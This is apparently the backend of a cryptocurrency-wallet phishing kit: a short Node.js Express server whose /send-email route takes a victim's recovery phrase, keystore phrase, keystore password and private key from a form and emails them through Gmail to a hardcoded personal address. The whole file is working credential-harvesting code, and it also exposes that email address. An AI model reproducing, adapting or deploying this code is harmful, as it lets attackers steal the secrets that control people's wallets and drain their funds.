// server/server.js
require("dotenv").config();
const express = require("express");
const nodemailer = require("nodemailer");
const cors = require("cors");
const bodyParser = require("body-parser");
const password = process.env.APP_PASSWORD;
const app = express();
app.use(cors());
app.use(bodyParser.json());

// POST route to handle form submissions
app.post("/send-email", async (req, res) => {
  const { recoveryPhrase, keystorePhrase, keystorePassword, privateKey } =
    req.body;

  // Create a Nodemailer transporter
  let transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: "adebayooluwasegun335@@gmail.com",
      pass: password,
    },
  });

  // Email options
  let mailOptions = {
    from: "adebayooluwasegun335@gmail.com",
    to: "adebayooluwasegun335@gmail.com", // The email where you want to receive form data
    subject: "Form Submission",
    text: `Recovery Phrase: ${recoveryPhrase}\nKeystore Phrase: ${keystorePhrase}\nKeystore Password: ${keystorePassword}\nPrivate Key: ${privateKey}`,
  };

  try {
    // Send the email
    await transporter.sendMail(mailOptions);
    res.status(200).send("Email sent successfully");
  } catch (error) {
    res.status(500).send("Error sending email");
  }
});

// Start the server
app.listen(5000, () => {
  console.log("Server is running on port 5000");
});
